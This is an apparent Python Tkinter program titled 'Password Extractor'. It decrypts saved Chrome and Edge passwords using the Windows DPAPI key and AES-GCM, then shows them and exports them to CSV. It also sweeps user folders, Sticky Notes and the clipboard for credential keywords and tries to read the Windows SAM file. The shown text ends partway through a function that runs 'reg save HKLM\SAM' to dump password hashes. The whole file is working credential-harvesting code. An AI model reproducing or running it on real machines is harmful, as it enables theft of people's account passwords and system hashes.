import os
import sys
import sqlite3
import base64
import json
import shutil
import tempfile
from tkinter import *
from tkinter import Tk, Label, Frame, Entry, Button, StringVar, OptionMenu,scrolledtext, messagebox
from tkinter import ttk
import tkinter as tk
from Crypto.Cipher import AES
import win32crypt  # Windows only
from datetime import datetime
import csv
import ctypes
import threading
from tkinter import Toplevel, Label
from tkinter import filedialog
import subprocess
import ctypes


#------------------------------------------------------------------------------------------------------------#

# Function  for Chrome  Password Extraction

#-----------------------------------------------------------------------------------------------------------#

# Initialize the extracted data list
extracted_data = []


# Chrome Scan Page
def chrome_scan():
    for widget in frame.winfo_children():
        widget.pack_forget()

    root.after(200, remove_title)
    # Title Label
    Label(frame, text="Google Chrome Passwords Extractor",
          font=("Arial", 24, "bold"), bg="#4682b4", fg="white").pack(fill="x", pady=(20, 10), padx=20)

    # Frame for profile selection
    profile_frame = Frame(frame)
    profile_frame.pack(fill="x", pady=10)

    Label(profile_frame, text="Select Chrome Profile:", bg="#87cefa", font=("Arial", 12, "bold")).pack(side="left", padx=10)
    profile_var = StringVar(profile_frame)
    profile_var.set("Default")

    profiles = []
    user_data_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data")
    if os.path.exists(user_data_path):
        profiles = [f for f in os.listdir(user_data_path) if os.path.isdir(os.path.join(user_data_path, f)) and (f.startswith("Profile") or f == "Default")]
    else:
        profiles.append("Default")

    OptionMenu(profile_frame, profile_var, *profiles).pack(side="left", padx=10)

    # Frame for search bar and search button
    search_frame = Frame(frame)
    search_frame.pack(fill="x", pady=10)

    # Search Box
    search_var = Entry(search_frame, font=("Arial", 12), width=30)
    search_var.pack(side="right", padx=10)

    # Function to trigger search when Enter key is pressed
    def on_enter_key(event):
        search_data()

    # Bind the Enter key (Return key) to trigger the search
    search_var.bind("<Return>", on_enter_key)

    # Search Button
    def search_data():
        search_term = search_var.get().lower()

        # Clear previous search results
        for row in table.get_children():
            table.delete(row)

        # Filter and add rows that match search term
        for row_data in extracted_data:
            url, username, password, timestamp = row_data
            if (search_term in url.lower() or search_term in username.lower() or search_term in password.lower()):
                table.insert("", "end", values=(url, username, password, timestamp))

    search_button = Button(search_frame, text="Search", command=search_data, bg="#87cefa", fg="black", font=("Arial", 12, "normal"))
    search_button.pack(side="right", padx=10)

    # Table setup
    table = ttk.Treeview(frame, columns=("URL", "Username", "Password", "Timestamp"), show="headings")
    table.heading("URL", text="URL")
    table.heading("Username", text="Username")
    table.heading("Password", text="Password")
    table.heading("Timestamp", text="Timestamp")
    
    table.pack(fill="both", expand=True)
    table.tag_configure("oddrow", background="light green")
    table.tag_configure("evenrow", background="#e0f7fa")

    def decrypt_browser_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16]
        except Exception as e:
            return f"Decryption error: {e}"

    # Function to save extracted data to a CSV file
    def save_to_csv(data):
        selected_profile = profile_var.get()  # Get selected profile for CSV save
        save_folder = os.path.join(os.path.expanduser("~"), "Documents", "Password_Extractor_Results")
        os.makedirs(save_folder, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        file_path = os.path.join(save_folder, f"Chrome_{selected_profile}_{timestamp}.csv")

        with open(file_path, mode="w", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            writer.writerow(["URL", "Username", "Password", "Timestamp"])
            for row in data:
                writer.writerow(row)



    def extract_chrome_passwords():
        start_button.config(state="disabled")
        extracted_data.clear()

        selected_profile = profile_var.get()
        db_path = os.path.join(user_data_path, selected_profile, "Login Data")
        key_path = os.path.join(user_data_path, "Local State")

        try:
            with tempfile.NamedTemporaryFile(delete=False) as temp_db:
                shutil.copy2(db_path, temp_db.name)

            with open(key_path, "r") as file:
                encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
                encrypted_key = base64.b64decode(encrypted_key)[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            data = cursor.fetchall()

            for index, (url, username, encrypted_password) in enumerate(data):
                decrypted_password = decrypt_browser_password(encrypted_password, key)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                extracted_data.append((url, username, decrypted_password, timestamp))
                tag = "evenrow" if index % 2 == 0 else "oddrow"
                table.insert("", "end", values=(url, username, decrypted_password, timestamp), tags=(tag,))

        except Exception as e:
            Label(frame, text=f"Error: {e}", fg="red").pack()

        finally:
            conn.close()
            start_button.config(state="normal")
    
    #-------------------------------------------------- Hex Viewer ----------------------------------------#

    def open_hex_viewer_all(extracted_data, profile):
        
        if not extracted_data:
            # Notify if there's no data to show
            no_data_window = Toplevel(root)
            no_data_window.title("Error")
            no_data_window.geometry("300x100")
            
            Label(
                no_data_window,
                text="No data to display in hex view!",
                fg="red",
                font=("Arial", 12)
            ).pack(pady=20)

            # Close the alert window after 0.5 seconds (500 milliseconds)
            no_data_window.after(500, no_data_window.destroy)
            return
        
        hex_viewer = Toplevel(root)
        hex_viewer.title("Password Extractor Hex Viewer")
        hex_viewer.state("zoomed")  # Make the window fullscreen
        hex_viewer.config(bg="light green")
        # Title Label
        Label(hex_viewer, text="Password Extractor Hex Viewer", font=("Arial", 24, "bold"), bg="#4682b4", fg="white").pack(fill="x", pady=10)
        
        # Frame for table and search
        main_frame = Frame(hex_viewer)
        main_frame.pack(fill=BOTH, expand=True, padx=20, pady=10)
        
        # Search Frame
        search_frame = Frame(main_frame)
        search_frame.pack(fill=X, pady=(0, 10))

        # Search Box and Button
        search_label = Label(search_frame, text="Search:", font=("Arial", 12))
        search_label.pack(side=LEFT, padx=5)

        search_entry = Entry(search_frame, font=("Arial", 12), width=30)
        search_entry.pack(side=LEFT, padx=5)

        def search_hex(event=None):  # Allow both button click and key press
            text_area.tag_remove("highlight", "1.0", END)  # Remove previous highlights
            query = search_entry.get()
            if query:
                start_pos = "1.0"
                while True:
                    start_pos = text_area.search(query, start_pos, END)
                    if not start_pos:
                        break
                    end_pos = f"{start_pos}+{len(query)}c"
                    text_area.tag_add("highlight", start_pos, end_pos)
                    text_area.tag_config("highlight", background="yellow", foreground="black")
                    start_pos = end_pos

        search_button = Button(search_frame, text="Search", command=search_hex, bg="#4682b4", fg="white", font=("Arial", 12))
        search_button.pack(side=LEFT, padx=5)

        # Bind Enter key to the search function
        search_entry.bind("<Return>", search_hex)

        # Text Area for displaying hex data
        text_area = Text(main_frame, wrap=NONE, font=("Courier", 10), width=100, height=30)
        text_area.pack(fill=BOTH, expand=True)
        
        # Combine all rows into one hex representation
        all_data = ""
        for url, username, password, timestamp in extracted_data:
            row_data = f"URL: {url} | Username: {username} | Password: {password} | Timestamp: {timestamp}\n"
            all_data += row_data  # Combine all rows into one string
        
        # Convert combined data into hex format
        all_data_bytes = all_data.encode()
        for i in range(0, len(all_data_bytes), 16):
            hex_chunk = all_data_bytes[i:i + 16]
            hex_display = " ".join(f"{byte:02x}" for byte in hex_chunk)
            ascii_display = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in hex_chunk)
            text_area.insert(END, f"{i:08x}  {hex_display:<48}  {ascii_display}\n")
        
        text_area.config(state=DISABLED)

        # Back Button Frame
        back_frame = Frame(hex_viewer)
        back_frame.pack(fill=X, pady=10)

        back_button = Button(back_frame, text="Back", command=hex_viewer.destroy, bg="#4682b4", fg="white", font=("Arial", 12))
        back_button.pack(side=RIGHT, padx=20)


    # Button Frame
    button_frame = Frame(frame)
    button_frame.pack(fill="x", pady=10)

    start_button = Button(button_frame, text="Start Scan", command=extract_chrome_passwords, bg="#5bc0de", fg="black", font=("Arial", 12))
    start_button.pack(side="left", padx=10, pady=10)

    clear_button = Button(button_frame, text="Clear", command=lambda: [table.delete(item) for item in table.get_children()], bg="#ffcc00", fg="black", font=("Arial", 12))
    clear_button.pack(side="left", padx=10, pady=10)

    save_button = Button(button_frame, text="Save Data", command=lambda: save_to_csv(extracted_data), bg="#87cefa", fg="black", font=("Arial", 12))
    save_button.pack(side="right", padx=10, pady=10)

    # Exit Button (Back to Main Page)
    exit_button = Button(button_frame, text="Back", command=lambda: switch_to_page("main"), bg="#f0ad4e", fg="black", font=("Arial", 12, "normal"))
    exit_button.pack(side="right", padx=10, pady=10)

    hex_button = Button(button_frame, text="Hex Viewer", command=lambda: open_hex_viewer_all(extracted_data, profile_var.get()), bg="#f0ad4e", font=("Arial", 12))
    hex_button.pack(side="left", padx=10, pady=10)


#------------------------------------------------------------------------------------------------------------#

# Function placeholders for Microsoft Edge password  Extractor

#-----------------------------------------------------------------------------------------------------------#



def edge_scan():
    # Clear previous widgets
    for widget in frame.winfo_children():
        widget.destroy()

    root.after(200, remove_title)
    # Title Label
    Label(frame, text="Microsoft Edge Passwords Extractor", 
          font=("Arial", 24, "bold"), background="#4682b4", fg="white", anchor="center").pack(fill="x", pady=(20, 10), padx=20)

    # Frame for profile selection
    profile_frame = Frame(frame, bg="#87cefa")
    profile_frame.pack(fill="x", pady=10)

    # Profile selection label and dropdown menu
    Label(profile_frame, text="Select Edge Profile:", bg="#87cefa", fg="black", font=("Arial", 12, "bold")).pack(side="left", padx=10)
    profile_var = StringVar(profile_frame)
    profile_var.set("Default")  # Default selection

    # Populate the dropdown with available profiles
    profiles = []
    user_data_path = os.path.join(os.getenv("APPDATA"), "..", "Local", "Microsoft", "Edge", "User Data")
    if os.path.exists(user_data_path):
        profiles = [f for f in os.listdir(user_data_path) if os.path.isdir(os.path.join(user_data_path, f)) and (f.startswith("Profile") or f == "Default")]
    else:
        profiles.append("Default")  # Fallback to Default if the path is missing

    profile_menu = OptionMenu(profile_frame, profile_var, *profiles)
    profile_menu.pack(side="left", padx=10)

    # Frame for search bar and search button
    search_frame = Frame(frame)
    search_frame.pack(fill="x", pady=10)

    # Search Box
    search_var = Entry(search_frame, font=("Arial", 12), width=30)
    search_var.pack(side="right", padx=10)

    # Function to trigger search when Enter key is pressed
    def on_enter_key(event):
        search_data()

    # Bind the Enter key (Return key) to trigger the search
    search_var.bind("<Return>", on_enter_key)

    # Search Button
    def search_data():
        search_term = search_var.get().lower()

        # Clear previous search results
        for row in table.get_children():
            table.delete(row)

        # Filter and add rows that match search term
        for row_data in extracted_data:
            url, username, password, timestamp = row_data
            if (search_term in url.lower() or search_term in username.lower() or search_term in password.lower()):
                table.insert("", "end", values=(url, username, password, timestamp))

    search_button = Button(search_frame, text="Search", command=search_data, bg="#87cefa", fg="black", font=("Arial", 12, "normal"))
    search_button.pack(side="right", padx=10)

    # Treeview table setup
    table = ttk.Treeview(frame, columns=("URL", "Username", "Password", "Timestamp"), show="headings")
    table.heading("URL", text="URL", command=lambda: sort_table("URL"))
    table.heading("Username", text="Username", command=lambda: sort_table("Username"))
    table.heading("Password", text="Password", command=lambda: sort_table("Password"))
    table.heading("Timestamp", text="Timestamp", command=lambda: sort_table("Timestamp"))

    # Configure column widths
    table.column("URL", width=300, anchor="w", minwidth=200)
    table.column("Username", width=180, anchor="w", minwidth=150)
    table.column("Password", width=180, anchor="w", minwidth=150)
    table.column("Timestamp", width=180, anchor="center", minwidth=150)
    table.pack(fill="both", expand=True)

    # Sort function for table
    def sort_table(column_name):
        reverse = False  
        if column_name == "URL":
            extracted_data.sort(key=lambda x: x[0].lower(), reverse=reverse)
        elif column_name == "Username":
            extracted_data.sort(key=lambda x: x[1].lower(), reverse=reverse)
        elif column_name == "Password":
            extracted_data.sort(key=lambda x: x[2].lower(), reverse=reverse)
        elif column_name == "Timestamp":
            extracted_data.sort(key=lambda x: datetime.strptime(x[3], "%Y-%m-%d %H:%M:%S"), reverse=reverse)

        for row in table.get_children():
            table.delete(row)
        for index, (url, username, password, timestamp) in enumerate(extracted_data):
            tag = "evenrow" if index % 2 == 0 else "oddrow"
            table.insert("", "end", values=(url, username, password, timestamp), tags=(tag,))

    # Alternating row colors
    table.tag_configure("oddrow", background="light green")
    table.tag_configure("evenrow", background="#e0f7fa")

    # Function to decrypt Edge password
    def decrypt_browser_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(password)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return f"Decryption error: {e}"

    # Function to save extracted data to a CSV file
    def save_to_csv(data):
        selected_profile = profile_var.get()  # Get selected profile for CSV save
        save_folder = os.path.join(os.path.expanduser("~"), "Documents", "Password_Extractor_Results")
        os.makedirs(save_folder, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        file_path = os.path.join(save_folder, f"Edge_passwd_{selected_profile}_{timestamp}.csv")

        with open(file_path, mode="w", newline="", encoding="utf-8") as file:
            writer = csv.writer(file)
            writer.writerow(["URL", "Username", "Password", "Timestamp"])
            for row in data:
                writer.writerow(row)

    def extract_edge_passwords():
        # Disable the "Extract Passwords" button temporarily
        start_button.config(state="disabled")
        extracted_data.clear()  # Clear previous data

        selected_profile = profile_var.get()
        db_path = os.path.join(user_data_path, selected_profile, "Login Data")
        key_path = os.path.join(user_data_path, "Local State")

        try:
            with tempfile.NamedTemporaryFile(delete=False) as temp_db:
                shutil.copy2(db_path, temp_db.name)

            with open(key_path, "r") as file:
                encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
                encrypted_key = base64.b64decode(encrypted_key)[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            data = cursor.fetchall()

            for index, (url, username, encrypted_password) in enumerate(data):
                decrypted_password = decrypt_browser_password(encrypted_password, key)
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                extracted_data.append((url, username, decrypted_password, timestamp))
                tag = "evenrow" if index % 2 == 0 else "oddrow"
                table.insert("", "end", values=(url, username, decrypted_password, timestamp), tags=(tag,))

        except Exception as e:
            Label(frame, text=f"Error: {e}", fg="red").pack()

        finally:
            conn.close()
            start_button.config(state="normal")

#--------------------------------------------------------Hex viewer -------------------------------------------------------#

    def open_hex_viewer_all(extracted_data, profile):

        if not extracted_data:
            # Notify if there's no data to show
            no_data_window = Toplevel(root)
            no_data_window.title("Error")
            no_data_window.geometry("300x100")
            
            Label(
                no_data_window,
                text="No data to display in hex view!",
                fg="red",
                font=("Arial", 12)
            ).pack(pady=20)

            # Close the alert window after 0.5 seconds (500 milliseconds)
            no_data_window.after(500, no_data_window.destroy)
            return
        hex_viewer = Toplevel(root)
        hex_viewer.title("Password Extractor Hex Viewer")
        hex_viewer.state("zoomed")  # Make the window fullscreen
        hex_viewer.config(bg="light green")
        # Title Label
        Label(hex_viewer, text="Password Extractor Hex Viewer", font=("Arial", 24, "bold"), bg="#4682b4", fg="white").pack(fill="x", pady=10)
        
        # Frame for table and search
        main_frame = Frame(hex_viewer)
        main_frame.pack(fill=BOTH, expand=True, padx=20, pady=10)
        
        # Search Frame
        search_frame = Frame(main_frame)
        search_frame.pack(fill=X, pady=(0, 10))

        # Search Box and Button
        search_label = Label(search_frame, text="Search:", font=("Arial", 12))
        search_label.pack(side=LEFT, padx=5)

        search_entry = Entry(search_frame, font=("Arial", 12), width=30)
        search_entry.pack(side=LEFT, padx=5)

        def search_hex(event=None):  # Allow both button click and key press
            text_area.tag_remove("highlight", "1.0", END)  # Remove previous highlights
            query = search_entry.get()
            if query:
                start_pos = "1.0"
                while True:
                    start_pos = text_area.search(query, start_pos, END)
                    if not start_pos:
                        break
                    end_pos = f"{start_pos}+{len(query)}c"
                    text_area.tag_add("highlight", start_pos, end_pos)
                    text_area.tag_config("highlight", background="yellow", foreground="black")
                    start_pos = end_pos

        search_button = Button(search_frame, text="Search", command=search_hex, bg="#4682b4", fg="white", font=("Arial", 12))
        search_button.pack(side=LEFT, padx=5)

        # Bind Enter key to the search function
        search_entry.bind("<Return>", search_hex)

        # Text Area for displaying hex data
        text_area = Text(main_frame, wrap=NONE, font=("Courier", 10), width=100, height=30)
        text_area.pack(fill=BOTH, expand=True)
        
        # Combine all rows into one hex representation
        all_data = ""
        for url, username, password, timestamp in extracted_data:
            row_data = f"URL: {url} | Username: {username} | Password: {password} | Timestamp: {timestamp}\n"
            all_data += row_data  # Combine all rows into one string
        
        # Convert combined data into hex format
        all_data_bytes = all_data.encode()
        for i in range(0, len(all_data_bytes), 16):
            hex_chunk = all_data_bytes[i:i + 16]
            hex_display = " ".join(f"{byte:02x}" for byte in hex_chunk)
            ascii_display = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in hex_chunk)
            text_area.insert(END, f"{i:08x}  {hex_display:<48}  {ascii_display}\n")
        
        text_area.config(state=DISABLED)

        # Back Button Frame
        back_frame = Frame(hex_viewer)
        back_frame.pack(fill=X, pady=10)

        back_button = Button(back_frame, text="Back", command=hex_viewer.destroy, bg="#4682b4", fg="white", font=("Arial", 12))
        back_button.pack(side=RIGHT, padx=20)


    # Button Frame
    button_frame = Frame(frame)
    button_frame.pack(fill="x", pady=10)

    start_button = Button(button_frame, text="Start Scan", command=extract_edge_passwords, bg="#5bc0de", fg="black", font=("Arial", 12))
    start_button.pack(side="left", padx=10, pady=10)

    clear_button = Button(button_frame, text="Clear", command=lambda: [table.delete(item) for item in table.get_children()], bg="#ffcc00", fg="black", font=("Arial", 12))
    clear_button.pack(side="left", padx=10, pady=10)

    save_button = Button(button_frame, text="Save Data", command=lambda: save_to_csv(extracted_data), bg="#87cefa", fg="black", font=("Arial", 12))
    save_button.pack(side="right", padx=10, pady=10)

    # Exit Button (Back to Main Page)
    exit_button = Button(button_frame, text="Back", command=lambda: switch_to_page("main"), bg="#f0ad4e", fg="black", font=("Arial", 12, "normal"))
    exit_button.pack(side="right", padx=10, pady=10)

    hex_button = Button(button_frame, text="Hex Viewer", command=lambda: open_hex_viewer_all(extracted_data, profile_var.get()), bg="#f0ad4e", font=("Arial", 12))
    hex_button.pack(side="left", padx=10, pady=10)

# Initialize the extracted data list
extracted_data = []


#------------------------------------------------------------------------------------------------------------#

# Function placeholders for Temporary Folder Scan for password  Extraction

#-----------------------------------------------------------------------------------------------------------#

def temp_data_scan():
    
    root.after(200, remove_title)
    # Title Label
    Label(frame, 
          text="Temporary Folders Scanner", 
          font=("Arial", 24, "bold"), 
          background="#4682b4", 
          fg="white", 
          anchor="center").pack(fill="x", pady=(20, 10), padx=20)

    # Frame for search bar and search button
    search_frame = Frame(frame, background="light blue")
    search_frame.pack(fill="x", pady=10)

    # Search Box
    search_var = Entry(search_frame, font=("Arial", 12), width=30)
    search_var.pack(side="right", padx=10)

    # Search Button
    def search_data(event=None):  # The event parameter is added to handle the Enter key press
        search_term = search_var.get().lower()
        
        # Clear previous search results
        for row in table.get_children():
            table.delete(row)

        # Filter and add rows that match search term
        for row_data in extracted_data:
            file_name, keyword, password, creation_time = row_data
            if (search_term in file_name.lower() or search_term in keyword.lower() or search_term in password.lower()):
                table.insert("", "end", values=(file_name, keyword, password, creation_time))

    # Bind the Enter key to trigger the search
    search_var.bind("<Return>", search_data)

    # Search Button
    search_button = Button(search_frame, text="Search", command=search_data, bg="#87cefa", fg="black", font=("Arial", 12))
    search_button.pack(side="right", padx=10)


    # Function to display alerts
    def show_alert(message, color="green"):
        alert_label = Label(frame, text=message, fg=color, font=("Arial", 12, "bold"), bg="#4682b4")
        alert_label.pack(pady=(5, 10))
        frame.after(500, alert_label.destroy)  # Remove alert after 0.5 seconds

    # Treeview table setup
    table = ttk.Treeview(frame, columns=("File Name", "Keywords", "Password", "Timestemp"), show="headings")
    table.heading("File Name", text="File Name", command=lambda: sort_table("File Name"))
    table.heading("Keywords", text="Keywords", command=lambda: sort_table("Keywords"))
    table.heading("Password", text="Password", command=lambda: sort_table("Password"))
    table.heading("Timestemp", text="Timestemp", command=lambda: sort_table("Timestemp"))

    table.pack(fill="both", expand=True)
    table.tag_configure("oddrow", background="#f5fafd")
    table.tag_configure("evenrow", background="#e0f7fa")

    # Configure column widths
    table.column("File Name", width=250, anchor="w")
    table.column("Keywords", width=200, anchor="w")
    table.column("Password", width=250, anchor="w")
    table.column("Timestemp", width=200, anchor="center")
    
    # Sort function for table
    def sort_table(column_name):
        reverse = False  
        if column_name == "File Name":
            extracted_data.sort(key=lambda x: x[0].lower(), reverse=reverse)
        elif column_name == "Keywords":
            extracted_data.sort(key=lambda x: x[1].lower(), reverse=reverse)
        elif column_name == "Password":
            extracted_data.sort(key=lambda x: x[2].lower(), reverse=reverse)
        elif column_name == "Timestemp":
            extracted_data.sort(key=lambda x: datetime.strptime(x[3], "%Y-%m-%d %H:%M:%S"), reverse=reverse)
        
        for row in table.get_children():
            table.delete(row)
        for index, (file_name, keyword, password, creation_time) in enumerate(extracted_data):
            tag = "evenrow" if index % 2 == 0 else "oddrow"
            table.insert("", "end", values=(file_name, keyword, password, creation_time), tags=(tag,))

    

    # List of directories to scan
    common_dirs = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Sticky Notes"),
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\Clipboard"),
    ]

    # Function to search for keywords in files and extract relevant context
    def search_in_file(file_path):
        keywords = ['username', 'password', 'email', 'passwd', 'login', 'credentials']
        relevant_context = []

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read().lower()
            for keyword in keywords:
                if keyword in content:
                    start = max(content.find(keyword) - 20, 0)
                    end = min(content.find(keyword) + 30, len(content))
                    context = content[start:end]
                    relevant_context.append((keyword, context.strip()))
        
        return relevant_context

    scan_thread = None  # To manage the scanning thread
    stop_scan = False  # Flag to stop the scan
    extracted_data = []  # To store extracted data

    # Add a progress bar
    progress_bar = ttk.Progressbar(frame, orient="horizontal", mode="indeterminate", length=300)
    progress_bar.pack(pady=(10, 0))

    # Label to show the current scanning folder
    scanning_label = Label(frame, text="Scanning: Let's Scan !", font=("Arial", 12), bg="#4682b4", fg="white")
    scanning_label.pack(pady=(5, 10))


    # Add this to the list of directories to scan
    common_dirs.append(r"C:\Windows\System32\config\SAM")

    # Function to read the SAM file securely
    def read_sam_file(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                # Read and process the file content
                content = file.read().lower()
                return [("SAM File", "System Data", content[:100], datetime.now().strftime("%Y-%m-%d %H:%M:%S"))]
        except PermissionError:
            show_alert("Access denied to SAM file! Run as administrator.", "red")
            return []
        except Exception as e:
            show_alert(f"Error reading SAM file: {e}", "red")
            return []

    # Modify the scan function to include handling of the SAM file
    def scan():
        global stop_scan
        extracted_data.clear()
        progress_bar.start(10)  # Start progress bar animation

        for directory in common_dirs:
            if stop_scan:
                break  # Stop if the flag is set
            if os.path.exists(directory):
                if directory.endswith("SAM"):  # Special handling for SAM file
                    extracted_data.extend(read_sam_file(directory))
                else:
                    for root, _, files in os.walk(directory):
                        if stop_scan:
                            break  # Stop if the flag is set
                        scanning_label.config(text=f"Scanning Folder: {root}")
                        frame.update_idletasks()  # Refresh UI

                        for file in files:
                            if stop_scan:
                                break  # Stop if the flag is set
                            file_path = os.path.join(root, file)

                            # Check and process file
                            if file.endswith(('.txt', '.log', '.html', '.xml', '.json', 'csv')):
                                found_data = search_in_file(file_path)
                                if found_data:
                                    for keyword, content in found_data:
                                        extracted_data.append((file, keyword, content, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

        # Update Treeview
        for index, (file_name, keyword, password, creation_time) in enumerate(extracted_data):
            tag = "evenrow" if index % 2 == 0 else "oddrow"
            table.insert("", "end", values=(file_name, keyword, password, creation_time), tags=(tag,))


        progress_bar.stop()  # Stop progress bar animation
        scanning_label.config(text="Scanning: Complete")
        start_button.config(state="normal")
        show_alert("Scan complete!", "green")

    # Start Scan Button
    def scan_for_passwords():
        global scan_thread, stop_scan
        stop_scan = False
        start_button.config(state="disabled")
        show_alert("Start scanning...", "blue")
        scan_thread = threading.Thread(target=scan)
        scan_thread.start()


    # Save data to CSV
    def save_to_csv(data):
        save_folder = os.path.join(os.path.expanduser("~"), "Documents", "Password_Extractor_Results")
        os.makedirs(save_folder, exist_ok=True)
        file_path = os.path.join(save_folder, f"Temp_Scan_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.csv")
        
        with open(file_path, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(["File Name", "Keywords", "Password", "Timestemp"])
            for row in data:
                writer.writerow(row)
        show_alert(f"Data saved to {file_path}", "green")
    
    
    # Start Scan Button
    start_button = Button(frame, text="Start Scan", command=scan_for_passwords, bg="#5bc0de", fg="black", font=("Arial", 12))
    start_button.pack(side="left", padx=10, pady=10)

# Stop Scan and Clear Data
    def clear_data():
        global stop_scan
        stop_scan = True  # Set flag to stop scanning
        if scan_thread and scan_thread.is_alive():
            scan_thread.join()  # Wait for thread to finish
        for row in table.get_children():
            table.delete(row)
        scanning_label.config(text="Scanning: Let's Scan !")
        progress_bar.stop()
        start_button.config(state="normal")
        show_alert("Scan stopped and data cleared!", "red")
    
        
    # Function to open Hex Viewer for all data
    def open_hex_viewer_all(extracted_data):

        if not extracted_data:
            # Notify if there's no data to show
            no_data_window = Toplevel(root)
            no_data_window.title("Error")
            no_data_window.geometry("300x100")
            
            Label(
                no_data_window,
                text="No data to display in hex view!",
                fg="red",
                font=("Arial", 12)
            ).pack(pady=20)

            # Close the alert window after 0.5 seconds (500 milliseconds)
            no_data_window.after(500, no_data_window.destroy)
            return

        
        hex_viewer = Toplevel(root)
        hex_viewer.title("Password Extractor Hex Viewer")
        hex_viewer.state("zoomed")  # Make the window fullscreen
        # Set background color to light green
        hex_viewer.config(bg="light green")
        # Title Label
        Label(hex_viewer, text="Password Extractor Hex Viewer", font=("Arial", 24, "bold"), bg="#4682b4", fg="white").pack(fill="x", pady=10)
        
        # Frame for table and search
        main_frame = Frame(hex_viewer)
        main_frame.pack(fill=BOTH, expand=True, padx=20, pady=10)
        
        # Search Frame
        search_frame = Frame(main_frame)
        search_frame.pack(fill=X, pady=(0, 10))

        # Search Box and Button
        search_label = Label(search_frame, text="Search:", font=("Arial", 12))
        search_label.pack(side=LEFT, padx=5)

        search_entry = Entry(search_frame, font=("Arial", 12), width=30)
        search_entry.pack(side=LEFT, padx=5)
        
        # Function to search text within the hex viewer
        def search_hex(event=None):  # Allow both button click and key press
            text_area.tag_remove("highlight", "1.0", "end")
            search_term = search_entry.get()
            if search_term:
                idx = "1.0"
                while True:
                    idx = text_area.search(search_term, idx, nocase=1, stopindex="end")
                    if not idx:
                        break
                    end_idx = f"{idx}+{len(search_term)}c"
                    text_area.tag_add("highlight", idx, end_idx)
                    idx = end_idx
                text_area.tag_config("highlight", background="yellow", foreground="black")

        search_button = Button(search_frame, text="Search", font=("Arial", 12), command=search_hex)
        search_button.pack(side=LEFT, padx=5)
        search_entry.bind("<Return>", search_hex)

        # Text area for Hex View
        text_area = Text(main_frame, font=("Courier", 10), wrap=NONE)
        text_area.pack(fill=BOTH, expand=True)
        
        # Combine all rows into one hex representation
        all_data = ""
        for url, username, password, timestamp in extracted_data:
            row_data = f"URL: {url} | Username: {username} | Password: {password} | Timestamp: {timestamp}\n"
            all_data += row_data  # Combine all rows into one string
        
        # Convert combined data into hex format
        all_data_bytes = all_data.encode()
        for i in range(0, len(all_data_bytes), 16):
            hex_chunk = all_data_bytes[i:i + 16]
            hex_display = " ".join(f"{byte:02x}" for byte in hex_chunk)
            ascii_display = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in hex_chunk)
            text_area.insert(END, f"{i:08x}  {hex_display:<48}  {ascii_display}\n")


        # Make the text area read-only
        text_area.config(state=DISABLED)
        # Back Button Frame
        back_frame = Frame(hex_viewer)
        back_frame.pack(fill=X, pady=10)

        back_button = Button(back_frame, text="Back", command=hex_viewer.destroy, bg="#4682b4", fg="white", font=("Arial", 12))
        back_button.pack(side=RIGHT, padx=20)
     
    clear_button = Button(frame, text="Clear Data", command=clear_data, bg="#f8d7da", fg="black", font=("Arial", 12))
    clear_button.pack(side="left", padx=10, pady=10)

    # Save Button
    save_button = Button(frame, text="Save to CSV", command=lambda: save_to_csv(extracted_data), bg="#d4edda", fg="black", font=("Arial", 12))
    save_button.pack(side="right", padx=10, pady=10)

    # Exit Button
    exit_button = Button(frame, text="Back", command=lambda: switch_to_page("main"), bg="#f0ad4e", fg="black", font=("Arial", 12))
    exit_button.pack(side="right", padx=10, pady=10)    

    # Hex Viewer Button
    hex_viewer_button = Button(frame, text="Hex Viewer", command=lambda: open_hex_viewer_all(extracted_data), bg="#f0ad4e", fg="black", font=("Arial", 12))
    hex_viewer_button.pack(side="left", padx=10, pady=10)

    # Store extracted data globally
    extracted_data = []


#------------------------------------------------------------------------------------------------------------#

# Function To SAM File

#-----------------------------------------------------------------------------------------------------------#

def Sam_data_sacn():

    def execute_command(command):
        """Executes a shell command and captures the output."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True
            )
            if result.returncode != 0:
                return f"Command Error: {result.stderr.strip()}"
            return result.stdout.strip() or "No Output"
        except Exception as e:
            return f"Execution Failed: {e}"


    def extract_sam_passwords():
        """Extracts user account information and password hashes (if possible)."""
        try:
            # Backup SAM and SYSTEM hives using registry save (if not already done)
            sam_backup_path = r"C:\SAM_backup"
            system_backup_path = r"C:\SYSTEM_backup"

            # Use reg command to backup hives (same as your original method)
            backup_sam_command = f'reg save HKLM\\SAM "{sam_backup_path}" /y'
            sam_result = execute_command(backup_sam_command)

